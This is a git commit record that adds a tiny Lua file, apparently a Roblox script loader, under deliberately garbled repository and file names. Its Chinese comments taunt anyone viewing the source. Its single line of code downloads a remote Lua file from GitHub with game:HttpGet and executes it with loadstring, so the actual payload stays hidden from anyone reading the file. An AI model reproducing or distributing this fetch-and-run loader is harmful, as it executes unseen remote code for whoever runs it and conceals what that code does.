d04ec4536c9a93ac07dce4787a9a4f2fc73cb3d6
qkjEJOSOQJSJSkjwh-6467sjh9djja <dittoteam@163.com>
2024-08-05 22:12:40 +0800

    Create dittoloooooooooooooooooooooiiiiiiiiiiiiiii.lua

---
+++ dittoloooooooooooooooooooooiiiiiiiiiiiiiii.lua
@@ -0,0 +1,4 @@
+--LOL
+--主播，你来这里干嘛
+--我源码有什么好看的
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aksjsjdkwjwjdj-jwjdjdjekwjjdbdj146619/ditto.o---Weishan-------------O.O---NMIXX-------OOOOOOOOOOOO.OOOOO---o.o/main/dittolol---------------idklolloloooooooooooooooooo.lua"))()
